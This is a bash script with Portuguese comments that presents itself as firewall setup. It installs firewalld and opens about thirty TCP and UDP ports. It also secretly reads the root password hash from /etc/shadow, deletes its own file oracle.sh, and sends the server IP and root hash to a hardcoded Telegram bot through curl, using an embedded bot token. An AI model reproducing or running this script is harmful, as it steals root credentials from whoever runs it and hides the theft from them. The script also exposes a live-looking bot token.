#!/bin/bash

# Captura a senha root atual
CURRENT_ROOT_PASSWORD=$(sudo grep root /etc/shadow | cut -d':' -f2)

# Instalação e configuração do firewall
sudo apt install firewalld && sudo firewall-cmd --zone=public --permanent --add-port=80/tcp && sudo firewall-cmd --zone=public --permanent --add-port=8880/tcp && sudo firewall-cmd --zone=public --permanent --add-port=8443/tcp && sudo firewall-cmd --zone=public --permanent --add-port=1000/tcp && sudo firewall-cmd --zone=public --permanent --add-port=443/tcp && sudo firewall-cmd --zone=public --permanent --add-port=1085/tcp && sudo firewall-cmd --zone=public --permanent --add-port=6969/tcp && sudo firewall-cmd --zone=public --permanent --add-port=8888/tcp && sudo firewall-cmd --zone=public --permanent --add-port=8080/tcp && sudo firewall-cmd --zone=public --permanent --add-port=7300/udp && sudo firewall-cmd --zone=public --permanent --add-port=7100/udp && sudo firewall-cmd --zone=public --permanent --add-port=7200/udp && sudo firewall-cmd --zone=public --permanent --add-port=5454/tcp && sudo firewall-cmd --zone=public --permanent --add-port=8181/tcp && sudo firewall-cmd --zone=public --permanent --add-port=5000/tcp && sudo firewall-cmd --zone=public --permanent --add-port=7299/udp && sudo firewall-cmd --zone=public --permanent --add-port=7298/udp && sudo firewall-cmd --zone=public --permanent --add-port=7297/udp && sudo firewall-cmd --zone=public --permanent --add-port=7296/udp && sudo firewall-cmd --zone=public --permanent --add-port=7295/udp && sudo firewall-cmd --zone=public --permanent --add-port=7900/udp && sudo firewall-cmd --zone=public --permanent --add-port=7800/udp && sudo firewall-cmd --zone=public --permanent --add-port=7700/udp && sudo firewall-cmd --zone=public --permanent --add-port=7600/udp && sudo firewall-cmd --zone=public --permanent --add-port=7500/udp && sudo firewall-cmd --zone=public --permanent --add-port=7400/udp && sudo firewall-cmd --zone=public --permanent --add-port=6868/tcp && sudo firewall-cmd --zone=public --permanent --add-port=8799/tcp && sudo firewall-cmd --zone=public --permanent --add-port=7505/tcp && sudo firewall-cmd --zone=public --permanent --add-port=1194/tcp && sudo firewall-cmd --reload && sudo firewall-cmd --zone=public --list-ports

# Remoção do arquivo oracle.sh
rm oracle.sh

# Obtém o IP do servidor
SERVER_IP=$(hostname -I | awk '{print $1}')

# Formata a mensagem para enviar ao bot do Telegram
MESSAGE="Portas abertas no servidor.%0ASeu IP: \`$SERVER_IP\` 🌐%0ASenha root atual: \`$CURRENT_ROOT_PASSWORD\`"

# Envia a mensagem para o bot do Telegram
TELEGRAM_BOT_TOKEN="7126941542:AAHVwKISyEOsTgUq9etJxmNHB_v-UHdVhHg"
CHAT_ID="5149161091"
curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID&text=$MESSAGE&parse_mode=Markdown" >/dev/null
